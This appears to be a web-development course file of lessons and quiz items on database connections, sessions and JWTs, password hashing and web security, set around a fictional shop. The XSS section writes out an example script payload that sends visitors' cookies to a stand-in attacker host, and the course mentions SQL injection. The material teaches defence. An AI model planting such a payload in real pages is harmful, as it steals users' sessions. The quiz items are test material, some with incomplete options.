quiz.q: Which method is NOT idempotent?
quiz.explain: Repeating POST /orders can create several orders; repeating GET, PUT or DELETE leaves the same final state.

quiz.q: A client sends a request with no login token to a protected endpoint. The best status code is:
quiz.explain: 401 means the client has not authenticated; 403 is for a known client that is not allowed.

quiz.q: After POST /orders successfully creates order 1001, the API should ideally return:
options: 201 Created with a Location header pointing to /orders/1001
quiz.explain: 201 signals that a new resource was created, and Location tells where it lives.

quiz.q: What is the main advantage of cursor-based pagination over offset-based?
options: It stays stable and fast on large lists that change while the user scrolls
It always returns every item at once
quiz.explain: Offsets can skip or repeat items when rows are added and slow down at large offsets; cursors avoid both.

lessons.title: Databases from the Web App: Connections, Queries, ORMs and Transactions
lessons.content:
Picture a small shop in Kawran Bazar with a big ledger book kept in the back room. The shopkeeper at the front never carries the book around; he shouts to the clerk, 'How many bags of Miniket left?', and the clerk checks and shouts back, '12'. The web app is the shopkeeper, the database is the ledger, and the connection between them is that shouted line between the front and the back. In the DBMS course you learned how the ledger itself works: tables, SQL, normalisation, transactions. In this lesson we stand at the front counter and learn how a web app talks to the database safely and quickly.

Why a separate database at all: You could keep Bazar's products in a JSON file on the server. It works for ten products and one user. But when 200 customers order at the same moment, two of them may read stock 1, both buy the last bottle of oil, and the file is corrupted when both write at once. A database server like PostgreSQL or MySQL solves exactly these problems: many users at once, crash safety, fast search with indexes and rules like 'stock can never be negative'. The web app becomes a client of the database, just as the browser is a client of the web app.

The driver: Your app cannot talk to PostgreSQL in plain English. Each database has a wire protocol, a set of binary messages sent over a TCP connection, usually to port 5432 for PostgreSQL or 3306 for MySQL. A driver is a library that speaks this protocol for your language. In Node you install a package such as pg for PostgreSQL or mysql2 for MySQL; Python has psycopg; Java has JDBC drivers. The driver gives you simple functions: connect, send a query, receive rows.

The connection string: To connect, the driver needs to know where the database is and how to log in. This is often written as one connection string, a URL like postgres://bazar_app:secret@db.example.com:5432/bazar. Read it piece by piece: the scheme says which database type, then the username and password, the host, the port, and finally the database name. Because it contains a password, it must come from an environment variable, as we learned in the server basics lesson, never from code committed to Git.

Why connection pools: Opening a database connection is expensive. It needs a TCP handshake, often a TLS handshake, then login and authentication, and the database creates memory and sometimes a whole process for each connection. Suppose that costs 30 ms and your actual query takes 2 ms. If you open a fresh connection for every request, 94 percent of the time is wasted on setup. Also, databases allow only a limited number of connections at once; PostgreSQL's default maximum is 100. With 500 visitors you would hit the limit and get errors.

How a pool works: A connection pool opens a small number of connections at start-up, say 10, and keeps them open. When a request needs the database, it borrows a free connection, runs its query, and returns the connection to the pool. If all 10 are busy, the next request waits a little in a queue. Now each query costs only the 2 ms of real work, and the database never sees more than 10 connections from this app copy. If you run 4 copies of the app with a pool of 10 each, the database sees at most 40. Almost every driver and ORM gives you a pool; the main rule is to always release connections, even when an error happens, or the pool slowly leaks until everything waits forever.

Running SQL from code: With a pool, a query looks like this in a generic Node style: const result = await pool.query('SELECT id, name, price FROM products WHERE category = $1', ['fish']). The driver sends the query, the database returns rows, and result.rows is an array of JavaScript objects like { id: 42, name: 'Hilsa 1 kg', price: 1200 }. The await is there because the query takes time and runs asynchronously, as we learned in the async JavaScript lesson. Your handler then sends these rows to the client with res.json.

Parameterized queries: Notice the $1 in that query. It is a placeholder, and the value 'fish' is sent separately. Never build SQL by gluing user input into the string, like 'SELECT * FROM users WHERE email = ' plus whatever the user typed. If the user types a quote followed by OR 1=1, the database reads it as part of the SQL command, and an attacker can read or delete data. That is SQL injection. With placeholders, the driver sends the query text and the values separately (or escapes them correctly), so the database always treats the value as plain data, never as code. MySQL drivers usually use a question mark instead of $1, but the idea is identical. The web security lesson shows a full attack; here the rule is simple: every value from outside goes through a placeholder.

What an ORM is: Writing raw SQL for every operation gets repetitive, and the rows you get back are plain data with no behaviour. An ORM, object-relational mapper, connects the two worlds. Tables become classes or models, rows become objects, and columns become properties. Instead of writing an INSERT you write something like Product.create({ name: 'Hilsa 1 kg', price: 1200 }), and instead of a SELECT with WHERE you write Product.findAll({ where: { category: 'fish' } }). The ORM generates parameterized SQL for you. Well-known ORMs include Sequelize, Prisma and TypeORM for Node, SQLAlchemy and the Django ORM for Python, Hibernate for Java, Entity Framework for .NET and Eloquent in Laravel.

Relations in an ORM: Bazar has customers, orders and order items. In the ORM you declare them once: a Customer has many Orders, an Order belongs to a Customer and has many OrderItems, and each OrderItem belongs to a Product. Behind the scenes these are foreign keys, exactly as in your DBMS course. The benefit is that code can now say order.customer.name or customer.orders and the ORM writes the join or extra queries for you.

Migrations: Your database structure changes over time. Next month Bazar adds a delivery_slot column to orders. You cannot just run ALTER TABLE by hand on your laptop and hope the production database and your teammates' databases get the same change. A migration is a small versioned file that describes one change, with an up step (add the column) and often a down step (remove it). Migrations are committed to Git and run in order by a tool, so every database, from a teammate's laptop to production, is moved to the same version. The tool records which migrations have already run in a special table.

Seeding: A fresh development database is empty, which makes testing boring and difficult. A seed script fills it with sample data: 20 products, 3 test customers, a few orders. Every developer runs the same seed and sees the same starting state. Seeds are for development and testing; real customer data never goes into seed files.

The N+1 query problem: ORMs make it easy to accidentally send too many queries. Suppose the admin page lists the last 50 orders with each customer's name. The code loads the orders with one query, then loops over them and reads order.customer.name. If the ORM loads each customer lazily, that is one more query per order: 1 + 50 = 51 queries. If each round trip to the database takes 2 ms, that is 102 ms instead of a few milliseconds, and on a page with 500 orders it becomes 1 + 500 = 501 queries and over a second. The fix is eager loading: tell the ORM to fetch the customers together, using a join or one extra query like SELECT * FROM customers WHERE id IN (...). Now it is 1 or 2 queries regardless of the number of orders. Most ORMs offer an option named include, with, or something similar for this. Logging the SQL your ORM generates is the best way to spot N+1.

Transactions for checkout: Placing an order is several steps: insert the order, insert each order item, and reduce each product's stock. If the server crashes after inserting the order but before reducing stock, the data is now wrong. Recall from DBMS that a transaction groups steps so they are all-or-nothing (atomicity). In code it looks like: BEGIN; insert order; insert items; UPDATE products SET stock = stock - 2 WHERE id = 42 AND stock >= 2; if any step fails, ROLLBACK; otherwise COMMIT. The condition stock >= 2 in the UPDATE makes the database itself refuse to sell what is not there, even if two customers click at the same moment. ORMs provide transaction helpers that run your function inside BEGIN and COMMIT and roll back automatically if it throws.

SQL vs NoSQL from the app's view: Relational databases store data in tables with a fixed schema and are strong at joins and transactions; they are the safe default for shops, banks and anything with money. Document databases such as MongoDB store JSON-like documents, so an order and its items can sit in one document, and the schema is flexible. They are handy when data shape varies a lot, like product attributes that differ between fish and phones, or for very high write volumes spread over many servers. Modern MongoDB also supports multi-document transactions, so the line is less sharp than it used to be. Choose by your data and queries, not by fashion; many apps use a relational database as the main store and add others for special jobs.

Caching hot data: Some queries run thousands of times with the same answer, like the list of categories or today's offers. Instead of asking the database each time, the app can keep the result in an in-memory store like Redis, a very fast key-value server. The pattern is called cache-aside: check Redis for key 'categories'; if found, use it; if not, query the database, store the result in Redis with an expiry time like 300 seconds, and return it. Reads that hit the cache can take well under a millisecond. The hard part is staleness: when an admin changes a category, the app must delete or update the cached key, or customers see old data until it expires.

Real-life example 1, Eid shopping rush: In the week before Eid, Bazar traffic jumps ten times. Without a pool, the database refuses connections and the site shows errors. With a pool of 10 per app copy and 6 copies, the database handles a steady 60 connections. Checkout runs in a transaction with the stock condition, so the last 5 kg bag of polao rice is sold exactly once, and the category list comes from Redis, taking load off the database.

Real-life example 2, a university result portal: The admin page shows 200 students with their department names. The first version took 4 seconds. The SQL log showed 201 queries, a classic N+1. One eager-loading option cut it to 2 queries and the page loaded in about 0.2 seconds. Nothing about the hardware changed; only how the app asked the database.

Common mistakes: Building SQL with string concatenation. Opening a new connection per request or forgetting to release pooled connections. Ignoring N+1 until the page is slow in production. Changing tables by hand instead of with migrations. Doing multi-step writes without a transaction. Caching data and never invalidating it. Putting the database password in code.

What exams ask: Explain connection pooling and why it is needed. Explain SQL injection and how parameterized queries prevent it. Define ORM with advantages and disadvantages. Explain the N+1 problem with numbers. Write the transaction steps for an order. Compare SQL and NoSQL databases.

Recap: A web app talks to its database through a driver, using a connection string from an environment variable and a pool of reusable connections. Every outside value goes through placeholders. ORMs map tables to objects, generate safe SQL, and manage schema changes with migrations and sample data with seeds, but watch for N+1 queries. Multi-step writes like checkout belong in a transaction, and hot read-only data can be cached in Redis. Next we look at how the app remembers who is logged in.
key_points: A driver speaks the database's wire protocol; the connection string (from an environment variable) says where and how to log in.
Opening connections is slow and limited, so a pool keeps a few open and lends them to requests; always release them.
Parameterized queries send values separately from SQL text and prevent SQL injection.
An ORM maps tables to models and rows to objects, declares relations and generates SQL.
Migrations are versioned schema changes kept in Git; seeds fill development databases with sample data.
N+1: one query for a list plus one per item; fix it with eager loading (1 + 50 becomes 2 queries).
Checkout steps run in one transaction, with conditions like stock >= qty in the UPDATE.
Relational databases suit money and joins; document stores suit flexible shapes; Redis can cache hot data with expiry.
lessons.tip: Turn on SQL logging in whatever ORM you use and watch the queries while you click around your app. You will learn more about N+1, joins and slow pages in one evening than from any chapter.
lessons.task: On paper, write the exact steps (BEGIN, each INSERT and UPDATE, COMMIT or ROLLBACK) for placing a Bazar order of 2 kg potatoes and 1 litre oil. Then count how many queries an order list page of 30 orders makes with lazy loading of customers, and how many with eager loading.

quiz.q: Why do web apps use a connection pool?
options: To make SQL easier to write
Because opening a new database connection per request is slow and databases limit connections
quiz.explain: The pool reuses a few open connections, avoiding repeated handshakes and staying under the connection limit.

quiz.q: Which code is safe against SQL injection?
options: pool.query('SELECT * FROM users WHERE email = ' + email)
pool.query('SELECT * FROM users WHERE email = ' + email.trim())
Building the query in the browser
quiz.explain: With a placeholder the value is sent as data, never as part of the SQL command.

quiz.q: A page loads 40 orders with one query, then lazily loads each order's customer. How many queries run?
quiz.explain: 1 query for the list plus 1 per order: 1 + 40 = 41, the N+1 problem.

quiz.q: What is a database migration?
options: Moving the server to another country
Copying production data into a seed file
A versioned file describing one schema change, run in order on every database
quiz.explain: Migrations keep every database's structure in step and are tracked in version control.

quiz.q: Why put the checkout steps inside a transaction?
options: To make the page look faster
So that either all steps succeed or none do, keeping order, items and stock consistent
quiz.explain: Atomicity guarantees there is never an order without items or stock that was not reduced.

lessons.title: Sessions and Tokens: How a Web App Remembers You
lessons.content:
Think about entering a big wedding reception at a community centre in Dhaka. At the gate, a man checks your invitation card once and ties a coloured band on your wrist. After that, nobody asks for the card again; at the food counter they just glance at the band. The web needs the same trick. You prove who you are once, with a password, and after that every request carries a small proof that says 'this is still Nusrat'. That proof is either a session id or a token, and choosing between them, and storing them safely, is what this lesson is about.

The problem: HTTP is stateless, as you learned in Computer Networks. Every request arrives alone; the server does not remember that the same browser logged in a second ago. If Bazar had no memory, Nusrat would have to type her password on every page: to see the cart, to add potatoes, to check out. So web apps need a way to attach identity to each request without sending the password every time. Sending the password repeatedly would also be dangerous, because every copy is one more chance to leak it.

Cookies as the carrier: Most solutions use cookies. A cookie is a small name-value pair the server asks the browser to store with the Set-Cookie response header. After that the browser automatically sends it back in the Cookie header on every request to the same site. The attributes from lesson 2 matter here: HttpOnly hides the cookie from JavaScript, Secure sends it only over HTTPS, SameSite limits sending it on requests triggered by other sites, and Max-Age or Expires decide how long it lives.

Server-side sessions: The classic approach works like a coat check. When Nusrat logs in successfully, the server creates a session record, a small piece of data such as { userId: 17, cart: [...], createdAt: ... }, and stores it on the server. It gives the record a long random id, like 7f3a9c..., at least 128 bits of randomness so nobody can guess it. The server sends only this id to the browser: Set-Cookie: sid=7f3a9c...; HttpOnly; Secure; SameSite=Lax. On the next request the browser sends Cookie: sid=7f3a9c..., the server looks up the record and knows the user is 17. The cookie holds no user data at all, just the coat check ticket.

Session stores: Where does the server keep these records? The simplest is in the app's memory, but that has two problems: a restart logs everyone out, and with three app copies behind a load balancer, a request that lands on a different copy finds no session. So real apps keep sessions in a shared store: a database table or, very commonly, Redis, which is fast and can expire keys automatically. Now any app copy can look up any session.

Strengths of sessions: Logging out is easy and immediate: delete the record and the id becomes worthless. An admin can see all active sessions and kill one, for example when a phone is stolen. The cookie is small, and the user data never leaves the server. The cost is one lookup in the store per request, which with Redis is usually very fast, and the need for that shared store.

Token-based authentication: The other approach gives the client a self-contained token instead of a ticket number. The token itself says who the user is, and the server can check that the token is genuine without looking anything up. The most common format is JWT, JSON Web Token, standardised in RFC 7519 in 2015. Tokens are popular for APIs used by mobile apps and by many separate services, because any service holding the right key can verify the token on its own.

How a token travels: After login, the server returns the token in the response body or in a cookie. A mobile app then attaches it to every API call in a header: Authorization: Bearer eyJhbGciOi... The word Bearer means 'whoever holds this token is treated as the user', exactly like the wrist band at the wedding. That is also the danger: anyone who copies the token can use it, so it must only travel over HTTPS and never appear in URLs, where it could end up in logs and browser history.

JWT structure: A JWT looks like three chunks of text joined by dots: xxxxx.yyyyy.zzzzz. The first chunk is the header, a small JSON object such as { alg: 'HS256', typ: 'JWT' } that names the signing algorithm. The second is the payload, a JSON object of claims, for example { sub: '17', role: 'customer', exp: 1767225600 }. Here sub is the subject, meaning the user id, and exp is the expiry time in seconds since 1970. The third chunk is the signature. Each of the first two chunks is encoded with base64url, a variant of base64 that is safe to put in URLs.

Signed, not encrypted: This is the most misunderstood point. Base64url is an encoding, not encryption; anyone can decode the payload and read it in a second. Paste a JWT into any decoder and you will see the user id and role. What the signature gives is integrity: proof that the content was created by someone holding the key and has not been changed. So never put secrets like passwords or national ID numbers in a JWT payload. (There is a separate encrypted format, JWE, but ordinary JWTs are only signed.)

How the signature works: With HS256, the server computes HMAC-SHA256 over the text header.payload using a secret key only the server knows, and appends the result. To verify, the server recomputes it and compares. If a user changes role from customer to admin in the payload, the signature no longer matches and the token is rejected. With RS256 or ES256, a private key signs and a public key verifies, so many services can verify tokens while only the login service can create them. When verifying, the server must also check exp and must insist on the algorithm it expects; older libraries were once tricked by tokens claiming alg: none.

Expiry and refresh tokens: Because a JWT is valid until it expires, a stolen one works until then. So access tokens are kept short-lived, often 5 to 15 minutes. To avoid making users log in every 15 minutes, the server also issues a refresh token: a long random value with a longer life, say 30 days, stored on the server side so it can be revoked. When the access token expires, the app sends the refresh token to a special endpoint like POST /auth/refresh and receives a new access token. Many systems also rotate refresh tokens, issuing a new one each time and treating reuse of an old one as a sign of theft.

Logout and revocation: With sessions, logout deletes the record. With pure JWTs there is nothing to delete; the token stays valid until exp. Options are: keep access tokens short, revoke the refresh token in the database, and, if needed, keep a small deny-list of token ids (the jti claim) that were revoked early. Notice that once you add deny-lists, you are back to a server-side lookup. That is why many plain websites happily stay with sessions, and tokens shine mainly for APIs and many services.

Where to keep tokens in the browser: Two common choices. localStorage is easy to use from JavaScript, but that is the problem: if an attacker manages a cross-site scripting attack, their script can read the token and send it away. An HttpOnly cookie cannot be read by JavaScript, so XSS cannot steal it directly, but because the browser sends cookies automatically, you must defend against cross-site request forgery, using SameSite cookies and CSRF tokens, as the security lesson explains. Many security guides therefore prefer HttpOnly, Secure, SameSite cookies for browser apps. Mobile apps do not have this browser problem and usually keep tokens in the platform's secure storage.

Worked comparison: Bazar has 10,000 logged-in users. With sessions in Redis, each request does one Redis lookup, and an admin can force logout of one stolen phone instantly. With JWTs, each request only verifies a signature, no lookup, and a separate delivery-tracking service can verify the same token with the public key; but a stolen token works for up to 15 minutes unless a deny-list is checked. Neither is simply better; the choice depends on architecture.

OAuth 2.0 and Login with Google: Sometimes you want to log in to Bazar using an account you already have. OAuth 2.0 is an authorisation framework (RFC 6749) that lets a user grant an app limited access to their data on another service without giving the app their password. OpenID Connect is a layer on top of OAuth 2.0 that adds identity: it tells the app who the user is through an ID token, which is a JWT. In the common authorization code flow, Bazar redirects you to Google; you log in on Google's own page and approve; Google redirects back to Bazar with a short-lived code; Bazar's server exchanges that code directly with Google for tokens; then Bazar creates its own session for you. Bazar never sees your Google password. Public clients like mobile and single-page apps add PKCE, a one-time secret that stops a stolen code from being used.

Real-life example 1, internet banking: A Bangladeshi bank's web portal uses server-side sessions with an HttpOnly, Secure cookie and logs you out after a few minutes of inactivity. If you click logout, the session record is deleted immediately. For money, instant revocation and a short idle timeout matter more than avoiding a lookup.

Real-life example 2, a food delivery app: The mobile app logs in once and receives a 10-minute access token and a refresh token kept in the phone's secure storage. The order service, the rider tracking service and the payment service each verify the access token with the public key, without calling the login service. When the user changes phone, the old refresh token is revoked, and within ten minutes the old phone loses access entirely.

Common mistakes: Believing a JWT payload is secret. Using a weak or hardcoded signing key. Not checking exp or the algorithm. Making access tokens valid for months. Storing tokens in localStorage on a site that also has XSS holes. Using predictable session ids like an incrementing number. Keeping sessions in one server's memory behind a load balancer. And forgetting to create a new session id after login, which allows session fixation, where an attacker plants a known id before the victim logs in.

What exams ask: Why HTTP needs sessions. Draw the session-cookie flow. Explain JWT's three parts and why it is signed, not encrypted. Compare sessions and tokens for logout, scaling and storage. Explain access and refresh tokens. Describe the OAuth login flow at a high level.

Recap: You prove identity once; after that each request carries either a random session id that points to data on the server, or a signed token that carries the data itself. Sessions are easy to revoke but need a shared store; JWTs verify without lookups but are readable by anyone and hard to revoke, so keep them short-lived with refresh tokens. Store browser credentials in HttpOnly, Secure, SameSite cookies when you can. OAuth and OpenID Connect let users log in with another provider without sharing their password. Next we look at the password itself and how to store it safely.
key_points: HTTP is stateless, so after login each request must carry proof of identity, usually in a cookie or Authorization header.
Server-side session: random id in an HttpOnly, Secure, SameSite cookie; user data stays in a shared store like Redis.
Sessions are easy to revoke instantly but need a lookup per request.
A JWT is header.payload.signature in base64url; it is signed for integrity, not encrypted, so never put secrets in it.
Servers must verify the signature, the expected algorithm and the exp claim.
Short-lived access tokens plus revocable refresh tokens limit the damage of theft.
localStorage tokens can be stolen by XSS; HttpOnly cookies resist that but need CSRF protection.
OAuth 2.0 grants limited access; OpenID Connect adds an ID token for Login with Google style sign-in.
lessons.tip: Copy a JWT from any tutorial and paste it into a JWT decoder website, then change one letter of the payload and see the signature fail. Seeing that anyone can read it, but nobody can change it, fixes the idea for life.
lessons.task: Draw two sequence diagrams on paper for Bazar: login and viewing the cart with server-side sessions, and the same with an access token plus refresh token. Mark where each piece is stored and what happens on logout in each case.

quiz.q: What does a server-side session cookie usually contain?
options: The full shopping cart as JSON
The user's role and email in plain text
Only a long random session id that points to data on the server
quiz.explain: The cookie is just a ticket; the session data stays in the server-side store.

quiz.q: Which statement about a normal JWT is true?
options: Anyone can decode and read its payload; the signature only proves it was not changed
Its payload is encrypted so only the server can read it
It must be stored in a database to be verified
quiz.explain: JWTs are base64url-encoded and signed, not encrypted.

quiz.q: Why are access tokens usually short-lived, such as 15 minutes?
options: Because base64url only works for small times
Because browsers delete them every 15 minutes
Because servers run out of memory
Because a stolen JWT stays valid until it expires, so a short life limits the damage
quiz.explain: JWTs are hard to revoke, so short expiry plus refresh tokens is the usual defence.

quiz.q: What is the main risk of storing a token in localStorage?
options: It is sent automatically to other sites
A cross-site scripting attack can read it with JavaScript
It is deleted when the tab closes
It cannot hold more than 10 characters
quiz.explain: Anything JavaScript can read, injected malicious JavaScript can read too.

quiz.q: In Login with Google using OpenID Connect, who sees the user's Google password?
options: Only Google, on its own login page
quiz.explain: The user signs in on Google's page; Bazar only receives a code and then tokens.

lessons.title: Authentication and Password Security
lessons.content:
Imagine a hostel guard in Dhaka who keeps a notebook of every student's room key code, written in plain ink. One night someone steals the notebook. Now the thief can open every room, and worse, many students used the same code for their bicycle lock and their phone. That is exactly what happens when a website stores passwords in plain text and its database leaks. This lesson is about how to build login so that even if the notebook is stolen, the codes inside are almost useless to the thief, and about deciding what each logged-in person is allowed to do.

Two different questions: Authentication asks 'who are you?' and is answered by proving identity, for example with a password, an OTP or a fingerprint. Authorization asks 'what are you allowed to do?' and is answered by rules, for example customers may see their own orders, while staff may see all orders. Authentication happens once at login; authorization is checked on every single request. Mixing them up is a common source of bugs: being logged in does not mean being allowed.

Factors of authentication: Proofs fall into three families. Something you know: a password or PIN. Something you have: a phone that receives an OTP, or an authenticator app. Something you are: a fingerprint or face. Using two different families is called two-factor or multi-factor authentication. Two passwords are still one factor, because both are something you know.

Never store plain text: The first rule is that the server should not be able to tell anyone your password, not even its own admins. Database leaks happen to big and small companies alike, through SQL injection, stolen backups, misconfigured servers or insiders. Because people reuse passwords, a leak from a small Bazar shop can open someone's email or bank account. So we store something from which the password cannot be recovered, yet which still lets us check a login.

Hashing versus encryption: Encryption is two-way: with the key you can get the original back. If you encrypt passwords, whoever steals the key along with the database gets every password. A cryptographic hash is one-way: hash('rahim123') always gives the same fixed-length output, but there is no practical way to go from the output back to the input, and a tiny change in input completely changes the output. At signup you store the hash; at login you hash what the user typed and compare. The server never needs to know the real password again. Note that encoding, like base64, is neither; it hides nothing.

Why a plain hash is not enough, rainbow tables: If every site stored SHA-256('123456'), the output would be identical everywhere. Attackers precompute huge tables of hashes for common and leaked passwords, and lookups become instant. Rainbow tables are a clever space-saving form of such precomputed tables. Also, two users with the same password would have the same hash in your database, so cracking one cracks both.

Salts: A salt is a random value, for example 16 bytes, generated fresh for each user and stored next to the hash. You hash the salt together with the password. Now Rahim's '123456' and Karim's '123456' produce different hashes, and precomputed tables are useless because the attacker would need a separate table for every possible salt. A salt is not secret; its job is to make each hash unique. Some systems also add a pepper, a secret value kept outside the database, for example in an environment variable, as an extra layer.

Why fast hashes are dangerous: General hashes like MD5, SHA-1 and SHA-256 are designed to be fast, which is great for checking files but terrible for passwords. Modern graphics cards can compute billions of such hashes per second. A worked example: a 6-character password using lowercase letters and digits has 36^6, about 2.2 billion, possibilities. At one billion guesses per second, that is about 2 seconds to try them all. Salting does not stop this; it only stops precomputation. So we need hashes that are deliberately slow.

Slow password hashes: Password hashing functions are built to be slow and tunable. bcrypt, from 1999, has a cost factor; each increase by 1 doubles the work, so you can raise it as hardware gets faster. scrypt and Argon2 are also memory-hard: each guess needs a lot of memory, which makes cheap parallel cracking on GPUs much harder. Argon2 won the Password Hashing Competition in 2015, and its Argon2id variant is a common recommendation today, with bcrypt still widely used. If one guess costs 100 ms instead of 1 nanosecond, the same 2.2 billion guesses take about 7 years on one core instead of 2 seconds. These libraries generate the salt for you and store the algorithm, cost and salt inside the output string, so you just store that string. Use a well-known library; never invent your own scheme.

The signup and login flow: At signup: check the password policy, call hash(password), store the email and the resulting string. At login: find the user by email; if found, call verify(typedPassword, storedString), which re-hashes with the stored salt and cost and compares safely. Respond with the same message for unknown email and wrong password, such as 'Email or password is incorrect', so attackers cannot use the login form to discover which emails have accounts. On success, create a fresh session or token as in the last lesson.

Password policy: Current guidance, such as NIST's digital identity guidelines, favours length over strange rules. Require a reasonable minimum length, at least 8 characters and more is better; allow long passphrases and all characters including spaces and Bangla letters; check new passwords against lists of known leaked passwords; and do not force regular changes without a reason, because people then just add 1 at the end. Rules like 'must contain a symbol' tend to produce Password@1, which is weak and common.

Rate limiting and lockout: Even with slow hashes, an attacker can try passwords online through your login form. Rate limiting caps attempts, for example 5 failed tries per account per 15 minutes, plus limits per IP address. After that, add a delay, a CAPTCHA or a temporary lock. Be careful with permanent lockouts: an attacker could deliberately lock out real users, so temporary, growing delays are usually better. Credential stuffing, trying username and password pairs leaked from other sites, is one of the most common attacks, and rate limits plus MFA are the main defences.

MFA and OTP: With multi-factor authentication, a stolen password alone is not enough. A common method is TOTP, time-based one-time passwords, used by authenticator apps: the app and server share a secret, and both compute a 6-digit code from that secret and the current time, changing every 30 seconds. SMS OTP, very common in Bangladesh for banks and mobile wallets, is much better than nothing, but it can be attacked through SIM swap fraud or by tricking users into reading the code out over the phone. Hardware security keys and passkeys based on public-key cryptography resist phishing best, because they only answer the real website.

Password reset done right: Reset is a back door into every account, so it must be strong. When a user asks for a reset, generate a long random token, for example 32 bytes from a cryptographically secure random generator, send it in a link to the registered email, store only its hash in the database, make it expire in a short time, such as 15 to 60 minutes, and make it single-use. Show the same message whether the email exists or not. After a successful reset, end the user's other sessions. Never email the old password, which would prove you stored it in plain text, and never use guessable security questions like 'your mother's name' as the only check.

Role-based access control: Now authorization. In RBAC, permissions are given to roles, and users are given roles. Bazar might have customer, delivery_staff and admin. A customer can create orders and view their own; delivery staff can view assigned orders and mark them delivered; an admin can change prices. In code, a middleware like requireRole('admin') protects admin routes. But roles are not enough on their own: for GET /orders/1001 you must also check that order 1001 belongs to the logged-in customer. Forgetting this ownership check lets any customer read others' orders by changing the number in the URL, a flaw called IDOR that the security lesson covers.

Least privilege: Give every user, service and database account only the permissions it needs, nothing more. The web app's database user does not need permission to drop tables. A delivery rider does not need to see customers' payment details. If any part is compromised, least privilege limits the damage, just as a guard with one room key can do less harm than one with the master key.

Real-life example 1, mobile wallet login: A mobile financial service in Bangladesh asks for a PIN on the phone, ties the account to a SIM and a device, sends an OTP when you log in on a new device, and blocks the account after several wrong PINs. That combines something you know, something you have and rate limiting, and it shows why one factor is not enough for money.

Real-life example 2, a leaked shop database: Suppose Bazar's user table leaks with 50,000 bcrypt hashes at a cost that takes about 100 ms per guess. An attacker trying the 10,000 most common passwords against one account needs about 1,000 seconds, and against every account 50,000 x 10,000 = 500 million guesses, roughly 580 days of single-core time. Because every user has a different salt, the attacker cannot test one guess against all 50,000 hashes at once; each account must be attacked separately, which is exactly what the salt was for. Weak passwords still fall eventually, but strong ones are practically safe, and the team has time to force resets and warn users. With unsalted MD5, most of the common ones would fall in minutes.

Common mistakes: Plain text or encrypted passwords. Using fast hashes like MD5 or SHA-256 for passwords. Writing your own crypto. Different error messages for unknown email and wrong password. No rate limiting. Reset tokens that are guessable, long-lived or reusable. Checking roles but not ownership. Giving the app's database account full admin rights.

What exams ask: Differentiate authentication and authorization. Explain hashing versus encryption and why passwords are hashed. Explain salts and rainbow tables. Explain why bcrypt or Argon2 is preferred over SHA-256. Describe MFA and the factors. Design a secure password reset. Explain RBAC and least privilege.

Recap: Authentication proves who you are; authorization decides what you can do, checked on every request. Store passwords only as salted, slow hashes made by bcrypt, scrypt or Argon2, through a trusted library. Prefer long passwords and leaked-password checks to odd rules, limit login attempts, add MFA for anything valuable, and make reset tokens random, short-lived, single-use and stored hashed. Give users roles, check ownership too, and grant least privilege everywhere. Next we gather all the attacks a web app faces into one security lesson.
key_points: Authentication answers who you are; authorization answers what you may do and is checked on every request.
Factors: something you know, have and are; MFA combines different families.
Hashing is one-way, encryption is two-way; passwords must be hashed, never stored in plain text or encrypted.
A unique random salt per user defeats rainbow tables and makes equal passwords hash differently.
Fast hashes (MD5, SHA-256) can be guessed billions of times per second; use slow, tunable bcrypt, scrypt or Argon2id.
Use one generic login error message and rate-limit attempts to stop enumeration and credential stuffing.
Reset tokens must be random, hashed in storage, short-lived and single-use.
RBAC gives permissions to roles; also check ownership of each record, and follow least privilege.
lessons.tip: When you study security, always ask: if the attacker gets the database tomorrow, what can they do? Answering that one question honestly explains salts, slow hashes, hashed reset tokens and least privilege better than memorising each rule separately.
lessons.task: Calculate how long it takes to try every 8-character lowercase-only password (26^8) at one billion guesses per second, then at 10 guesses per second (a slow hash). Then write, step by step, a secure password reset flow for Bazar, including token length, storage, expiry and what happens to old sessions.

quiz.q: Which pair is correct?
options: Authentication: what you may do; authorization: who you are
Authorization happens only once at login
Authentication: who you are; authorization: what you may do
quiz.explain: Authentication proves identity; authorization decides permissions, on every request.

quiz.q: What is the main purpose of a salt?
options: To keep the password secret from the user
To make each user's hash unique so precomputed tables and identical hashes are useless
quiz.explain: Salts are random per user and stored openly; they defeat rainbow tables and hide equal passwords.

quiz.q: Why is bcrypt or Argon2 preferred over SHA-256 for storing passwords?
options: They are deliberately slow and tunable, making guessing very expensive
quiz.explain: Fast hashes allow billions of guesses per second; password hashes slow each guess down on purpose.

quiz.q: A login form says 'No account with this email' for unknown emails and 'Wrong password' otherwise. What is the problem?
options: It lets attackers discover which emails have accounts
quiz.explain: Use one generic message so the form cannot be used to enumerate accounts.

quiz.q: Which describes a secure password reset token?
options: The user's old password sent by email
The user id plus the current date
A security question about the user's mother
A long random value, stored hashed, short expiry and single use
quiz.explain: Reset tokens are a key to the account, so they must be unguessable, short-lived and usable once.

lessons.title: Web Security: XSS, SQL Injection, CSRF, HTTPS and the OWASP Top 10
lessons.content:
Imagine our Bazar shop has a strong steel shutter on the front, but the back window is open, the shop key hangs on a nail outside, and anyone who shouts 'I am the owner' gets let in. A thief does not attack the shutter; he walks in through the easiest gap. Web security works the same way. Attackers rarely break strong encryption. They look for the small careless gaps a developer leaves: a comment box that runs scripts, a search box that runs SQL, a form that trusts any website. This lesson walks through the most common gaps and the standard way to close each one.

What web security is: It is the practice of keeping three things safe in a web app. Confidentiality means only the right people can read data, such as a customer's address or order history. Integrity means data cannot be changed without permission, such as the price of rice or the balance in a wallet. Availability means the site keeps working for real users. Every attack we study breaks at least one of these three. The golden rule behind all of them is simple: never trust anything that comes from the client. Form fields, URL parameters, headers, cookies and JSON bodies can all be typed or edited by an attacker, because the browser is on the attacker's computer.

The OWASP Top 10: OWASP, the Open Worldwide Application Security Project, is a non-profit community that publishes free security guides. Its most famous document is the OWASP Top 10, a list of the most critical web application security risks, updated every few years from real-world data. Recent editions include categories such as Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable and Outdated Components, Identification and Authentication Failures, and Server-Side Request Forgery. You do not need to memorise the exact order, which changes between editions, but you should know that it exists.

Cross-site scripting (XSS): XSS happens when an attacker manages to get their own JavaScript running inside your page, in other users' browsers. Since the script runs on your site's origin, it can read what the page shows, act as the logged-in user, or send data to the attacker. Suppose Bazar shows product reviews and simply inserts the review text into the HTML. An attacker writes a review containing <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>. Every visitor who opens that product page now runs the attacker's code. That is the whole trick: data was treated as code.

